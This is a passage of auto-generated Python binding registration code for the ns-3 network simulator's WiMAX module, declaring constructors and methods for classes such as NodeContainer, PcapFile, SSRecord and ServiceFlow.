cls.add_constructor([param('ns3::NetDeviceContainer const &', 'a'), param('ns3::NetDeviceContainer const &', 'b')])
cls.add_method('Add',
'void',
[param('ns3::NetDeviceContainer', 'other')])
cls.add_method('Add',
'void',
[param('ns3::Ptr< ns3::NetDevice >', 'device')])
cls.add_method('Add',
'void',
[param('std::string', 'deviceName')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',
[],
is_const=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::NetDevice > const, std::vector< ns3::Ptr< ns3::NetDevice > > >',
[],
is_const=True)
cls.add_method('Get',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetN',
'uint32_t',
[],
is_const=True)
return
def register_Ns3NodeContainer_methods(root_module, cls):
cls.add_constructor([param('ns3::NodeContainer const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node')])
cls.add_constructor([param('std::string', 'nodeName')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd')])
cls.add_constructor([param('ns3::NodeContainer const &', 'a'), param('ns3::NodeContainer const &', 'b'), param('ns3::NodeContainer const &', 'c'), param('ns3::NodeContainer const &', 'd'), param('ns3::NodeContainer const &', 'e')])
cls.add_method('Add',
'void',
[param('ns3::NodeContainer', 'other')])
cls.add_method('Add',
'void',
[param('ns3::Ptr< ns3::Node >', 'node')])
cls.add_method('Add',
'void',
[param('std::string', 'nodeName')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',
[],
is_const=True)
cls.add_method('Create',
'void',
[param('uint32_t', 'n')])
cls.add_method('Create',
'void',
[param('uint32_t', 'n'), param('uint32_t', 'systemId')])
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Ptr< ns3::Node > const, std::vector< ns3::Ptr< ns3::Node > > >',
[],
is_const=True)
cls.add_method('Get',
'ns3::Ptr< ns3::Node >',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetGlobal',
'ns3::NodeContainer',
[],
is_static=True)
cls.add_method('GetN',
'uint32_t',
[],
is_const=True)
return
def register_Ns3ObjectBase_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectBase const &', 'arg0')])
cls.add_method('GetAttribute',
'void',
[param('std::string', 'name'), param('ns3::AttributeValue &', 'value')],
is_const=True)
cls.add_method('GetAttributeFailSafe',
'bool',
[param('std::string', 'name'), param('ns3::AttributeValue &', 'attribute')],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('SetAttribute',
'void',
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])
cls.add_method('SetAttributeFailSafe',
'bool',
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])
cls.add_method('TraceConnect',
'bool',
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('TraceConnectWithoutContext',
'bool',
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('TraceDisconnect',
'bool',
[param('std::string', 'name'), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('TraceDisconnectWithoutContext',
'bool',
[param('std::string', 'name'), param('ns3::CallbackBase const &', 'cb')])
cls.add_method('ConstructSelf',
'void',
[param('ns3::AttributeConstructionList const &', 'attributes')],
visibility='protected')
cls.add_method('NotifyConstructionCompleted',
'void',
[],
visibility='protected', is_virtual=True)
return
def register_Ns3ObjectDeleter_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectDeleter const &', 'arg0')])
cls.add_method('Delete',
'void',
[param('ns3::Object *', 'object')],
is_static=True)
return
def register_Ns3ObjectFactory_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([param('ns3::ObjectFactory const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('std::string', 'typeId')])
cls.add_method('Create',
'ns3::Ptr< ns3::Object >',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_const=True)
cls.add_method('Set',
'void',
[param('std::string', 'name'), param('ns3::AttributeValue const &', 'value')])
cls.add_method('SetTypeId',
'void',
[param('ns3::TypeId', 'tid')])
cls.add_method('SetTypeId',
'void',
[param('char const *', 'tid')])
cls.add_method('SetTypeId',
'void',
[param('std::string', 'tid')])
return
def register_Ns3OfdmDcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBaseStationId',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetChannelNr',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFrameDurationCode',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFrameNumber',
'uint32_t',
[],
is_const=True)
cls.add_method('GetRtg',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetTtg',
'uint8_t',
[],
is_const=True)
cls.add_method('SetBaseStationId',
'void',
[param('ns3::Mac48Address', 'baseStationId')])
cls.add_method('SetChannelNr',
'void',
[param('uint8_t', 'channelNr')])
cls.add_method('SetFrameDurationCode',
'void',
[param('uint8_t', 'frameDurationCode')])
cls.add_method('SetFrameNumber',
'void',
[param('uint32_t', 'frameNumber')])
cls.add_method('SetRtg',
'void',
[param('uint8_t', 'rtg')])
cls.add_method('SetTtg',
'void',
[param('uint8_t', 'ttg')])
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3OfdmDlBurstProfile_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDlBurstProfile const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetFecCodeType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetDiuc',
'void',
[param('uint8_t', 'diuc')])
cls.add_method('SetFecCodeType',
'void',
[param('uint8_t', 'fecCodeType')])
cls.add_method('SetLength',
'void',
[param('uint8_t', 'length')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3OfdmDlMapIe_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmDlMapIe const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('GetPreamblePresent',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetStartTime',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetDiuc',
'void',
[param('uint8_t', 'diuc')])
cls.add_method('SetPreamblePresent',
'void',
[param('uint8_t', 'preamblePresent')])
cls.add_method('SetStartTime',
'void',
[param('uint16_t', 'startTime')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3OfdmUlBurstProfile_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmUlBurstProfile const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetFecCodeType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLength',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetUiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetFecCodeType',
'void',
[param('uint8_t', 'fecCodeType')])
cls.add_method('SetLength',
'void',
[param('uint8_t', 'length')])
cls.add_method('SetType',
'void',
[param('uint8_t', 'type')])
cls.add_method('SetUiuc',
'void',
[param('uint8_t', 'uiuc')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3OfdmUlMapIe_methods(root_module, cls):
cls.add_constructor([param('ns3::OfdmUlMapIe const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDuration',
'uint16_t',
[],
is_const=True)
cls.add_method('GetMidambleRepetitionInterval',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetStartTime',
'uint16_t',
[],
is_const=True)
cls.add_method('GetSubchannelIndex',
'uint8_t',
[],
is_const=True)
cls.add_method('GetUiuc',
'uint8_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetCid',
'void',
[param('ns3::Cid', 'cid')])
cls.add_method('SetDuration',
'void',
[param('uint16_t', 'duration')])
cls.add_method('SetMidambleRepetitionInterval',
'void',
[param('uint8_t', 'midambleRepetitionInterval')])
cls.add_method('SetStartTime',
'void',
[param('uint16_t', 'startTime')])
cls.add_method('SetSubchannelIndex',
'void',
[param('uint8_t', 'subchannelIndex')])
cls.add_method('SetUiuc',
'void',
[param('uint8_t', 'uiuc')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
return
def register_Ns3PacketMetadata_methods(root_module, cls):
cls.add_constructor([param('uint64_t', 'uid'), param('uint32_t', 'size')])
cls.add_constructor([param('ns3::PacketMetadata const &', 'o')])
cls.add_method('AddAtEnd',
'void',
[param('ns3::PacketMetadata const &', 'o')])
cls.add_method('AddHeader',
'void',
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])
cls.add_method('AddPaddingAtEnd',
'void',
[param('uint32_t', 'end')])
cls.add_method('AddTrailer',
'void',
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])
cls.add_method('BeginItem',
'ns3::PacketMetadata::ItemIterator',
[param('ns3::Buffer', 'buffer')],
is_const=True)
cls.add_method('CreateFragment',
'ns3::PacketMetadata',
[param('uint32_t', 'start'), param('uint32_t', 'end')],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('Enable',
'void',
[],
is_static=True)
cls.add_method('EnableChecking',
'void',
[],
is_static=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint64_t',
[],
is_const=True)
cls.add_method('RemoveAtEnd',
'void',
[param('uint32_t', 'end')])
cls.add_method('RemoveAtStart',
'void',
[param('uint32_t', 'start')])
cls.add_method('RemoveHeader',
'void',
[param('ns3::Header const &', 'header'), param('uint32_t', 'size')])
cls.add_method('RemoveTrailer',
'void',
[param('ns3::Trailer const &', 'trailer'), param('uint32_t', 'size')])
cls.add_method('Serialize',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
return
def register_Ns3PacketMetadataItem_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PacketMetadata::Item const &', 'arg0')])
cls.add_instance_attribute('current', 'ns3::Buffer::Iterator', is_const=False)
cls.add_instance_attribute('currentSize', 'uint32_t', is_const=False)
cls.add_instance_attribute('currentTrimedFromEnd', 'uint32_t', is_const=False)
cls.add_instance_attribute('currentTrimedFromStart', 'uint32_t', is_const=False)
cls.add_instance_attribute('isFragment', 'bool', is_const=False)
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)
return
def register_Ns3PacketMetadataItemIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketMetadata::ItemIterator const &', 'arg0')])
cls.add_constructor([param('ns3::PacketMetadata const *', 'metadata'), param('ns3::Buffer', 'buffer')])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::PacketMetadata::Item',
[])
return
def register_Ns3PacketTagIterator_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketTagIterator const &', 'arg0')])
cls.add_method('HasNext',
'bool',
[],
is_const=True)
cls.add_method('Next',
'ns3::PacketTagIterator::Item',
[])
return
def register_Ns3PacketTagIteratorItem_methods(root_module, cls):
cls.add_constructor([param('ns3::PacketTagIterator::Item const &', 'arg0')])
cls.add_method('GetTag',
'void',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_const=True)
return
def register_Ns3PacketTagList_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PacketTagList const &', 'o')])
cls.add_method('Add',
'void',
[param('ns3::Tag const &', 'tag')],
is_const=True)
cls.add_method('Head',
'ns3::PacketTagList::TagData const *',
[],
is_const=True)
cls.add_method('Peek',
'bool',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('Remove',
'bool',
[param('ns3::Tag &', 'tag')])
cls.add_method('RemoveAll',
'void',
[])
return
def register_Ns3PacketTagListTagData_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::PacketTagList::TagData const &', 'arg0')])
cls.add_instance_attribute('count', 'uint32_t', is_const=False)
cls.add_instance_attribute('data', 'uint8_t [ 20 ]', is_const=False)
cls.add_instance_attribute('next', 'ns3::PacketTagList::TagData *', is_const=False)
cls.add_instance_attribute('tid', 'ns3::TypeId', is_const=False)
return
def register_Ns3PcapFile_methods(root_module, cls):
cls.add_constructor([])
cls.add_method('Clear',
'void',
[])
cls.add_method('Close',
'void',
[])
cls.add_method('Diff',
'bool',
[param('std::string const &', 'f1'), param('std::string const &', 'f2'), param('uint32_t &', 'sec'), param('uint32_t &', 'usec'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT')],
is_static=True)
cls.add_method('Eof',
'bool',
[],
is_const=True)
cls.add_method('Fail',
'bool',
[],
is_const=True)
cls.add_method('GetDataLinkType',
'uint32_t',
[])
cls.add_method('GetMagic',
'uint32_t',
[])
cls.add_method('GetSigFigs',
'uint32_t',
[])
cls.add_method('GetSnapLen',
'uint32_t',
[])
cls.add_method('GetSwapMode',
'bool',
[])
cls.add_method('GetTimeZoneOffset',
'int32_t',
[])
cls.add_method('GetVersionMajor',
'uint16_t',
[])
cls.add_method('GetVersionMinor',
'uint16_t',
[])
cls.add_method('Init',
'void',
[param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='ns3::PcapFile::SNAPLEN_DEFAULT'), param('int32_t', 'timeZoneCorrection', default_value='ns3::PcapFile::ZONE_DEFAULT'), param('bool', 'swapMode', default_value='false')])
cls.add_method('Open',
'void',
[param('std::string const &', 'filename'), param('std::_Ios_Openmode', 'mode')])
cls.add_method('Read',
'void',
[param('uint8_t * const', 'data'), param('uint32_t', 'maxBytes'), param('uint32_t &', 'tsSec'), param('uint32_t &', 'tsUsec'), param('uint32_t &', 'inclLen'), param('uint32_t &', 'origLen'), param('uint32_t &', 'readLen')])
cls.add_method('Write',
'void',
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('uint8_t const * const', 'data'), param('uint32_t', 'totalLen')])
cls.add_method('Write',
'void',
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_method('Write',
'void',
[param('uint32_t', 'tsSec'), param('uint32_t', 'tsUsec'), param('ns3::Header &', 'header'), param('ns3::Ptr< ns3::Packet const >', 'p')])
cls.add_static_attribute('SNAPLEN_DEFAULT', 'uint32_t const', is_const=True)
cls.add_static_attribute('ZONE_DEFAULT', 'int32_t const', is_const=True)
return
def register_Ns3PcapHelper_methods(root_module, cls):
cls.add_constructor([param('ns3::PcapHelper const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateFile',
'ns3::Ptr< ns3::PcapFileWrapper >',
[param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode'), param('uint32_t', 'dataLinkType'), param('uint32_t', 'snapLen', default_value='65535'), param('int32_t', 'tzCorrection', default_value='0')])
cls.add_method('GetFilenameFromDevice',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'useObjectNames', default_value='true')])
cls.add_method('GetFilenameFromInterfacePair',
'std::string',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::Object >', 'object'), param('uint32_t', 'interface'), param('bool', 'useObjectNames', default_value='true')])
return
def register_Ns3PcapHelperForDevice_methods(root_module, cls):
cls.add_constructor([param('ns3::PcapHelperForDevice const &', 'arg0')])
cls.add_constructor([])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('std::string', 'ndName'), param('bool', 'promiscuous', default_value='false'), param('bool', 'explicitFilename', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('ns3::NetDeviceContainer', 'd'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('ns3::NodeContainer', 'n'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcap',
'void',
[param('std::string', 'prefix'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcapAll',
'void',
[param('std::string', 'prefix'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('EnablePcapInternal',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'promiscuous'), param('bool', 'explicitFilename')],
is_pure_virtual=True, is_virtual=True)
return
def register_Ns3RandomVariable_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::RandomVariable const &', 'o')])
cls.add_method('GetInteger',
'uint32_t',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[],
is_const=True)
return
def register_Ns3SNRToBlockErrorRateManager_methods(root_module, cls):
cls.add_constructor([param('ns3::SNRToBlockErrorRateManager const &', 'arg0')])
cls.add_constructor([])
cls.add_method('ActivateLoss',
'void',
[param('bool', 'loss')])
cls.add_method('GetBlockErrorRate',
'double',
[param('double', 'SNR'), param('uint8_t', 'modulation')])
cls.add_method('GetSNRToBlockErrorRateRecord',
'ns3::SNRToBlockErrorRateRecord *',
[param('double', 'SNR'), param('uint8_t', 'modulation')])
cls.add_method('GetTraceFilePath',
'std::string',
[])
cls.add_method('LoadDefaultTraces',
'void',
[])
cls.add_method('LoadTraces',
'void',
[])
cls.add_method('ReLoadTraces',
'void',
[])
cls.add_method('SetTraceFilePath',
'void',
[param('char *', 'traceFilePath')])
return
def register_Ns3SNRToBlockErrorRateRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::SNRToBlockErrorRateRecord const &', 'arg0')])
cls.add_constructor([param('double', 'snrValue'), param('double', 'bitErrorRate'), param('double', 'BlockErrorRate'), param('double', 'sigma2'), param('double', 'I1'), param('double', 'I2')])
cls.add_method('Copy',
'ns3::SNRToBlockErrorRateRecord *',
[])
cls.add_method('GetBitErrorRate',
'double',
[])
cls.add_method('GetBlockErrorRate',
'double',
[])
cls.add_method('GetI1',
'double',
[])
cls.add_method('GetI2',
'double',
[])
cls.add_method('GetSNRValue',
'double',
[])
cls.add_method('GetSigma2',
'double',
[])
cls.add_method('SetBitErrorRate',
'void',
[param('double', 'arg0')])
cls.add_method('SetBlockErrorRate',
'void',
[param('double', 'arg0')])
cls.add_method('SetI1',
'void',
[param('double', 'arg0')])
cls.add_method('SetI2',
'void',
[param('double', 'arg0')])
cls.add_method('SetSNRValue',
'void',
[param('double', 'arg0')])
return
def register_Ns3SSRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::SSRecord const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Mac48Address', 'macAddress')])
cls.add_constructor([param('ns3::Mac48Address', 'macAddress'), param('ns3::Ipv4Address', 'IPaddress')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('DisablePollForRanging',
'void',
[])
cls.add_method('EnablePollForRanging',
'void',
[])
cls.add_method('GetAreServiceFlowsAllocated',
'bool',
[],
is_const=True)
cls.add_method('GetBasicCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetDsaRsp',
'ns3::DsaRsp',
[],
is_const=True)
cls.add_method('GetDsaRspRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('GetHasServiceFlowBe',
'bool',
[],
is_const=True)
cls.add_method('GetHasServiceFlowNrtps',
'bool',
[],
is_const=True)
cls.add_method('GetHasServiceFlowRtps',
'bool',
[],
is_const=True)
cls.add_method('GetHasServiceFlowUgs',
'bool',
[],
is_const=True)
cls.add_method('GetIPAddress',
'ns3::Ipv4Address',
[])
cls.add_method('GetInvitedRangRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('GetIsBroadcastSS',
'bool',
[])
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('GetModulationType',
'ns3::WimaxPhy::ModulationType',
[],
is_const=True)
cls.add_method('GetPollForRanging',
'bool',
[],
is_const=True)
cls.add_method('GetPollMeBit',
'bool',
[],
is_const=True)
cls.add_method('GetPrimaryCid',
'ns3::Cid',
[],
is_const=True)
cls.add_method('GetRangingCorrectionRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangingStatus',
'ns3::WimaxNetDevice::RangingStatus',
[],
is_const=True)
cls.add_method('GetServiceFlows',
'std::vector< ns3::ServiceFlow * >',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],
is_const=True)
cls.add_method('GetSfTransactionId',
'uint16_t',
[],
is_const=True)
cls.add_method('IncrementDsaRspRetries',
'void',
[])
cls.add_method('IncrementInvitedRangingRetries',
'void',
[])
cls.add_method('IncrementRangingCorrectionRetries',
'void',
[])
cls.add_method('ResetInvitedRangingRetries',
'void',
[])
cls.add_method('ResetRangingCorrectionRetries',
'void',
[])
cls.add_method('SetAreServiceFlowsAllocated',
'void',
[param('bool', 'val')])
cls.add_method('SetBasicCid',
'void',
[param('ns3::Cid', 'basicCid')])
cls.add_method('SetDsaRsp',
'void',
[param('ns3::DsaRsp', 'dsaRsp')])
cls.add_method('SetDsaRspRetries',
'void',
[param('uint8_t', 'dsaRspRetries')])
cls.add_method('SetIPAddress',
'void',
[param('ns3::Ipv4Address', 'IPaddress')])
cls.add_method('SetIsBroadcastSS',
'void',
[param('bool', 'arg0')])
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'macAddress')])
cls.add_method('SetModulationType',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetPollMeBit',
'void',
[param('bool', 'pollMeBit')])
cls.add_method('SetPrimaryCid',
'void',
[param('ns3::Cid', 'primaryCid')])
cls.add_method('SetRangingStatus',
'void',
[param('ns3::WimaxNetDevice::RangingStatus', 'rangingStatus')])
cls.add_method('SetSfTransactionId',
'void',
[param('uint16_t', 'sfTransactionId')])
return
def register_Ns3SeedManager_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SeedManager const &', 'arg0')])
cls.add_method('CheckSeed',
'bool',
[param('uint32_t', 'seed')],
is_static=True)
cls.add_method('GetRun',
'uint32_t',
[],
is_static=True)
cls.add_method('GetSeed',
'uint32_t',
[],
is_static=True)
cls.add_method('SetRun',
'void',
[param('uint32_t', 'run')],
is_static=True)
cls.add_method('SetSeed',
'void',
[param('uint32_t', 'seed')],
is_static=True)
return
def register_Ns3SendParams_methods(root_module, cls):
cls.add_constructor([param('ns3::SendParams const &', 'arg0')])
cls.add_constructor([])
return
def register_Ns3SequentialVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::SequentialVariable const &', 'arg0')])
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('double', 'i', default_value='1'), param('uint32_t', 'c', default_value='1')])
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('ns3::RandomVariable const &', 'i'), param('uint32_t', 'c', default_value='1')])
return
def register_Ns3ServiceFlow_methods(root_module, cls):
cls.add_constructor([param('ns3::Tlv', 'tlv')])
cls.add_constructor([param('ns3::ServiceFlow::Direction', 'direction')])
cls.add_constructor([])
cls.add_constructor([param('ns3::ServiceFlow const &', 'sf')])
cls.add_constructor([param('uint32_t', 'sfid'), param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])
cls.add_method('CheckClassifierMatch',
'bool',
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],
is_const=True)
cls.add_method('CleanUpQueue',
'void',
[])
cls.add_method('CopyParametersFrom',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('GetArqBlockLifeTime',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqBlockSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqDeliverInOrder',
'uint8_t',
[],
is_const=True)
cls.add_method('GetArqEnable',
'uint8_t',
[],
is_const=True)
cls.add_method('GetArqPurgeTimeout',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqRetryTimeoutRx',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqRetryTimeoutTx',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqSyncLoss',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqWindowSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetCid',
'uint16_t',
[],
is_const=True)
cls.add_method('GetConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('GetConvergenceSublayerParam',
'ns3::CsParameters',
[],
is_const=True)
cls.add_method('GetCsSpecification',
'ns3::ServiceFlow::CsSpecification',
[],
is_const=True)
cls.add_method('GetDirection',
'ns3::ServiceFlow::Direction',
[],
is_const=True)
cls.add_method('GetFixedversusVariableSduIndicator',
'uint8_t',
[],
is_const=True)
cls.add_method('GetIsEnabled',
'bool',
[],
is_const=True)
cls.add_method('GetIsMulticast',
'bool',
[],
is_const=True)
cls.add_method('GetMaxSustainedTrafficRate',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMaxTrafficBurst',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMaximumLatency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMinReservedTrafficRate',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMinTolerableTrafficRate',
'uint32_t',
[],
is_const=True)
cls.add_method('GetModulation',
'ns3::WimaxPhy::ModulationType',
[],
is_const=True)
cls.add_method('GetQosParamSetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetQueue',
'ns3::Ptr< ns3::WimaxMacQueue >',
[],
is_const=True)
cls.add_method('GetRecord',
'ns3::ServiceFlowRecord *',
[],
is_const=True)
cls.add_method('GetRequestTransmissionPolicy',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSchedulingType',
'ns3::ServiceFlow::SchedulingType',
[],
is_const=True)
cls.add_method('GetSchedulingTypeStr',
'char *',
[],
is_const=True)
cls.add_method('GetSduSize',
'uint8_t',
[],
is_const=True)
cls.add_method('GetServiceClassName',
'std::string',
[],
is_const=True)
cls.add_method('GetServiceSchedulingType',
'ns3::ServiceFlow::SchedulingType',
[],
is_const=True)
cls.add_method('GetSfid',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTargetSAID',
'uint16_t',
[],
is_const=True)
cls.add_method('GetToleratedJitter',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTrafficPriority',
'uint8_t',
[],
is_const=True)
cls.add_method('GetType',
'ns3::ServiceFlow::Type',
[],
is_const=True)
cls.add_method('GetUnsolicitedGrantInterval',
'uint16_t',
[],
is_const=True)
cls.add_method('GetUnsolicitedPollingInterval',
'uint16_t',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('InitValues',
'void',
[])
cls.add_method('PrintQoSParameters',
'void',
[],
is_const=True)
cls.add_method('SetArqBlockLifeTime',
'void',
[param('uint16_t', 'arg0')])
